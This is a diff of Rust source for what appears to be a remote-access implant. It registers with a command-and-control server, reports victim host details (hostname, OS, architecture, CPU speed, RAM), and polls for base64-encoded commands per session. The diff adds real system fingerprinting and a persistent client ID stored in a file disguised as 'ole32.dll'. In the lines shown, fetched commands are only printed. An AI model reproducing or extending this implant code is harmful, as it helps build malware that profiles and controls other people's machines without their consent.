@@ -2,19 +2,20 @@
 include!(concat!(env!("OUT_DIR"), "/profile.rs"));
 
 use base64::engine::{general_purpose::STANDARD as b64, Engine};
-use mac_address::get_mac_address;
 use reqwest::{
     self as rq,
     header::{HeaderMap, HeaderValue},
     StatusCode as st,
 };
 use serde::{Deserialize, Serialize};
-use std::{process, thread, time::Duration};
+use std::{fs, thread, time::Duration};
+use sys_info::{hostname, os_type};
+use uuid::Uuid;
 
 pub async fn run() {
     // Initializing variables from Profile JSON.
     let config = Config::new();
-    let server_cmds = ServerCommands::new();
+    // let server_cmds = ServerCommands::new();
     let endpoints = EndPoints::new();
 
     // Get our client
@@ -24,51 +25,77 @@ pub async fn run() {
     register(&client, &endpoints.register).await;
 
     // Mainloop
-    let session_id = loop {
-        let get_session = client.get(&endpoints.get_session).send().await.unwrap();
-
-        if get_session.status() == st::OK {
-            break get_session.text().await.unwrap();
-        }
-
-        sleep(5);
-    };
-
-    println!("session_id: {}", session_id);
     loop {
-        let command = loop {
-            let cmd_res = client
-                .get(&endpoints.fetch_cmd)
-                .body(session_id.clone())
-                .send()
-                .await
-                .unwrap();
+        let session_id = loop {
+            let get_session = client.get(&endpoints.get_session).send().await.unwrap();
 
-            if cmd_res.status() == st::OK {
-                let res_string = cmd_res.text().await.unwrap();
-                break Some(String::from_utf8(b64.decode(&res_string).unwrap()).unwrap());
-            } else if cmd_res.status() == st::GONE {
-                // Session has been killed, so let's get out
-                break None;
+            if get_session.status() == st::OK {
+                break get_session.text().await.unwrap();
             }
-            sleep(2);
+
+            sleep(5);
         };
 
-        if let None = command {
-            break;
-        }
+        loop {
+            let command = loop {
+                let cmd_res = client
+                    .get(&endpoints.fetch_cmd)
+                    .body(session_id.clone())
+                    .send()
+                    .await
+                    .unwrap();
 
-        // Command execution
-        println!("Command: {}", command.unwrap());
+                if cmd_res.status() == st::OK {
+                    let res_string = cmd_res.text().await.unwrap();
+                    break Some(String::from_utf8(b64.decode(&res_string).unwrap()).unwrap());
+                } else if cmd_res.status() == st::GONE {
+                    // Session has been killed, so let's get out
+                    break None;
+                }
+                sleep(2);
+            };
+
+            // If the session is dead, we're gonna need to return to
+            // getting session_id's(the outer loop). so break.
+            if let None = command {
+                break;
+            }
+
+            // Command execution
+            println!("Command: {}", command.unwrap());
+        }
     }
 }
 
-pub fn get_client(token: &str) -> rq::Client {
-    // The mac-address of the machine that is used as the ID of the machine.
-    let client_id = match get_mac_address() {
-        Ok(Some(mc_address)) => mc_address,
-        _ => process::exit(1),
+pub fn get_client_id(file_path: &str) -> String {
+    // Get client_id from where it's stored from.
+    // Closure for regenerating the client_id file.
+    let regenerate = || {
+        // Create a new file, and read from that, inserting a new
+        // client_id into the file.
+
+        // Newly generated ID
+        let new_id = Uuid::new_v4().to_string();
+        let encoded_id = b64.encode(new_id.as_bytes());
+        // Even if the next line panics, we don't have
+        // any other recovery plans at the moment
+        fs::write(file_path, &encoded_id).unwrap();
+        encoded_id
     };
+    let content = fs::read_to_string(file_path).unwrap_or_else(|_| regenerate());
+
+    // The error handling here ensures that if we can't parse the contents using b64
+    // we'll regenerate the file and parse it again.
+    String::from_utf8(b64.decode(&content).unwrap_or_else(|_| {
+        let encoded_id = regenerate();
+        b64.decode(&encoded_id).unwrap()
+    }))
+    .unwrap()
+}
+
+pub fn get_client(token: &str) -> rq::Client {
+    // Persistent client id.
+    let client_id = get_client_id("./ole32.dll");
 
     let mut headers = HeaderMap::new();
     headers.insert(
@@ -93,18 +120,38 @@ struct VictimSpecs {
     host_name: Option<String>,
     os: Option<String>,
     arch: Option<String>,
-    cpu: Option<String>,
-    ram: Option<u8>,
+    clock_speed: Option<u64>,
+    ram: Option<f64>,
+}
+
+impl VictimSpecs {
+    fn generate() -> VictimSpecs {
+        // Generate configurations according to the PC's specs
+        let host_name = hostname().ok();
+        let os = os_type().ok();
+
+        // TODO: Make the ARCH fetching at runtime.
+        let arch = Some(std::env::consts::ARCH.to_string());
+
+        let clock_speed = sys_info::cpu_speed().ok();
+
+        let ram = match sys_info::mem_info() {
+            Ok(mem_info) => Some(mem_info.total as f64 / (1024_f64.powf(2.0))),
+            Err(_) => None,
+        };
+
+        VictimSpecs {
+            host_name,
+            os,
+            arch,
+            clock_speed,
+            ram,
+        }
+    }
 }
 
 async fn register(client: &rq::Client, register_path: &str) {
-    let victim_specs = VictimSpecs {
-        host_name: Some("Bython17".to_string()),
-        os: Some("MacOS".to_string()),
-        arch: Some("x86_64".to_string()),
-        cpu: Some("Intel Core i7".to_string()),
-        ram: Some(8),
-    };
+    let victim_specs = VictimSpecs::generate();
 
     let status = client
         .post(register_path)
